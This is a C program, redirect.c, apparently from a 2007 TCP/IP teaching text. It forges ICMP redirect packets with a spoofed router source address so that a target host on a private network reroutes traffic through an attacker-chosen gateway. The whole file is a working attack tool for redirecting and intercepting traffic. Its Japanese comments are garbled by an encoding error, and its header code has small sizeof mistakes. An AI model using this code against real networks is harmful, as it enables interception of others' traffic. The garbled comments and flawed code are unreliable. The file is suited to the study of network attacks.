/**********************************************************************
 *  ICMP������쥯�ȥץ���� (redirect.c)
 *        Ver 2.1 2007ǯ 3�� 6��
 *                                ������� ¼������ (Yukio Murayama)
 *
 *  ���ѵ�����
 *    �ܥץ����ϡ�TCP/IP�ץ�ȥ���γؽ����ڤӡ��ͥåȥ���ץ�
 *    ����ߥ󥰤ε�ǽ����夵���뤿��ˤΤߡ����Τޤޡ��ޤ��ϡ�����
 *    ���ƻ��Ѥ��뤳�Ȥ��Ǥ��ޤ����ܥץ����ˤĤ��ơ�ˡΧ�Ƕػߤ�
 *    ��Ƥ��뤫���ޤ��ϡ�������¯��ȿ����褦�ʲ�¤���ڤӡ����Ѥ��
 *    �ߤ��ޤ����ܥץ�����̵�ݾڤǤ�������Ԥ��ܥץ����ˤ��
 *    ��ȯ�����������ʤ�»���ˤĤ��Ƥ���Ǥ���뤳�ȤϤǤ��ޤ���
 **********************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#define __FAVOR_BSD
#include <netinet/udp.h>
#include <arpa/inet.h>

#define CHKADDRESS(_saddr_) \
        {\
          unsigned char *p = (unsigned char *) &(_saddr_);\
          if ((p[0] == 127)\
           || (p[0] == 10)\
           || (p[0] == 172 && 16 <= p[1] && p[1] <= 31)\
           || (p[0] == 192 && p[1] == 168))\
            ;\
          else {\
            fprintf(stderr, "IP address error.\n");\
            exit(EXIT_FAILURE);\
          }\
        }

enum {CMD_NAME, TARGET_IP, OLD_ROUTER, NEW_ROUTER, DST_IP};

void make_udp_header(struct udphdr *udp);
void make_ip_header(struct ip *ip, int target_ip, int dst_ip, int proto,
                    int iplen);
void make_icmp5_header(struct icmp *icmp, u_int32_t gw_ip);
u_int16_t checksum(u_int16_t *data, int len);

int  main(int argc, char *argv[])
{
  struct sockaddr_in dest;   /* �����ۥ��ȤΥ��ɥ쥹            */
  unsigned char buff[1500];  /* �����Хåե�                    */
  struct ip *ip_new;         /* IP�إå��ؤΥݥ���            */
  struct ip *ip_old;         /* IP�إå��ؤΥݥ���            */
  struct icmp *icmp;         /* ICMP�إå��ؤΥݥ���          */
  struct udphdr *udp;        /* UDP�إå��ؤΥݥ���           */
  int s;                     /* �����åȥե�����ǥ�������ץ�  */
  int size;                  /* �Ƽ�Х��ȿ�                    */
  int on = 1;                /* ON                              */

  /* ���ޥ�ɥ饤��������Υ����å� */
  if (argc != 5) {
    fprintf(stderr, "usage %s targetd_host old_router new_router dst_ip\n",
            argv[CMD_NAME]);
    exit(EXIT_FAILURE);
  }

  /* raw�����åȤΥ����ץ� */
  if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
    perror("socket(SOCK_RAW)");
    exit(EXIT_FAILURE);
  }
  /* IP�إå������Ǻ������� */
  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof on) < 0) {
    perror("setsockopt(IP_HDRINCL)");
    exit(EXIT_FAILURE);
  }

  /* �ƥإå��Υݥ��󥿤����� */
  /* IP(20) + ICMP(8) + IP(20) + UDP(8) */
  ip_new = (struct ip     *) (buff);
  icmp   = (struct icmp   *) (buff + 20);
  ip_old = (struct ip     *) (buff + 20 + 8);
  udp    = (struct udphdr *) (buff + 20 + 8 + 20);
  size   = 20 + 8 + 20 + 8;

  /* �ѥ��åȤκ��� */
  make_udp_header(udp);
  make_ip_header(ip_old, inet_addr(argv[TARGET_IP]), inet_addr(argv[DST_IP]),
                 IPPROTO_UDP, 100);
  make_icmp5_header(icmp, inet_addr(argv[NEW_ROUTER]));
  make_ip_header(ip_new, inet_addr(argv[OLD_ROUTER]),
                 inet_addr(argv[TARGET_IP]), IPPROTO_ICMP, size);

  /* �������ɥ쥹������ */
  memset(&dest, 0, sizeof dest);
  dest.sin_family      = AF_INET;
  dest.sin_addr.s_addr = inet_addr(argv[TARGET_IP]);
  CHKADDRESS(dest.sin_addr.s_addr);

  /* �ѥ��åȤ����� */
  if (sendto(s, buff, size, 0, (struct sockaddr *) &dest, sizeof dest) < 0) {
    perror("sendto");
    exit(EXIT_FAILURE);
  }

  close(s);

  return 0;
}

/*
 * void make_ip_header(struct ip *ip, int target_ip, int dst_ip, int proto,
 *                     int iplen)
 * ��ǽ
 *     IP�إå��κ���
 * ������
 *     struct ip *ip;  ��������IP�إå�����Ƭ���ɥ쥹
 *     int target_ip;  ������IP���ɥ쥹
 *     int dst_ip;     ������IP���ɥ쥹
 *     int proto;      �ץ�ȥ���
 *     int iplen;      IP�ǡ�����������Ĺ
 * �����
 *     �ʤ�
 */
void make_ip_header(struct ip *ip, int target_ip, int dst_ip, int proto,
                    int iplen)
{
  memset(ip, 0, sizeof ip);

  /* IP�إå��κ��� */
  ip->ip_v   = IPVERSION;
  ip->ip_hl  = sizeof (struct ip) >> 2;
  ip->ip_id  = htons(0);
  ip->ip_off = 0;

#ifdef __linux
  /* Linux��raw IP�ξ�� */
  ip->ip_len = htons(iplen);
  ip->ip_off = htons(IP_DF);
#else
  /* BSD��raw IP�ξ�� */
  ip->ip_len = iplen;
  ip->ip_off = IP_DF;
#endif
  ip->ip_ttl = 2;
  ip->ip_p   = proto;
  ip->ip_src.s_addr = target_ip;
  ip->ip_dst.s_addr = dst_ip;

  /* �����å�����η׻� (raw ip�ϥإå������å������׻����Ƥ���뤬��
     ICMP�ǡ�������IP�إå��ޤǤϷ׻����Ƥ���ʤ�) */
  ip->ip_sum = 0;
  ip->ip_sum = checksum((u_int16_t *) ip, sizeof ip);
}

/*
 * void make_icmp5_header(struct icmp *icmp, u_int32_t gw_ip);
 * ��ǽ
 *     ICMP ������5(������쥯��)�إå��κ���
 * ������
 *     struct icmp *icmp;  ��������ICMP�إå�����Ƭ���ɥ쥹
 *     int n;              ICMP�������׵�Υ��������ֹ�
 * �����
 *     �ʤ�
 */
void make_icmp5_header(struct icmp *icmp, u_int32_t gw_ip)
{
  icmp->icmp_type  = ICMP_REDIRECT;
  icmp->icmp_code  = ICMP_REDIRECT_HOST;
  icmp->icmp_gwaddr.s_addr = gw_ip;
  icmp->icmp_cksum = 0;
  icmp->icmp_cksum = checksum((u_int16_t *) icmp, 8 + 20 + 8);
  /* ICMP (8) + IP (20) + UDP (8) */
}

/*
 * void make_udp_header(struct udphdr *udp);
 * ��ǽ
 *     UDP�إå��κ������ƥե�����ɤ��ͤϥ��ߡ���
 * ������
 *     struct udphdr *udp;  ��������UDP�إå�����Ƭ���ɥ쥹
 * �����
 *     �ʤ�
 */
void make_udp_header(struct udphdr *udp)
{
  udp->uh_sport = htons(2000);
  udp->uh_ulen  = htons(72);
  udp->uh_dport = htons(33434);
  udp->uh_sum   = htons(9999);
}

/*
 * u_int16_t checksum(u_int16_t *data, int len);
 * ��ǽ
 *     �����å�����η׻�
 * ������ 
 *     u_int16_t *data;  �����å���������ǡ���
 *     int len;          �ǡ����ΥХ��ȿ�
 * �����
 *     u_int16_t         �����å�������� (�����)
 */
u_int16_t checksum(u_int16_t *data, int len)
{
  u_int32_t sum = 0; /* ��������å����� */

  /* 2�Х��Ȥ��Ĳû� */
  for (; len > 1; len -= 2) {
    sum += *data++;
    if (sum & 0x80000000) 
      sum = (sum & 0xffff) + (sum >> 16);
  }

  /* �ǡ���Ĺ������Х��Ȥξ��ν��� */
  if (len == 1) {
    u_int16_t i = 0;
    *(u_char*) (&i) = *(u_char *) data;
    sum += i;
  }

  /* �夢�դ���ޤ��֤� */
  while (sum >> 16)
    sum = (sum & 0xffff) + (sum >> 16);

  return ~sum;
}
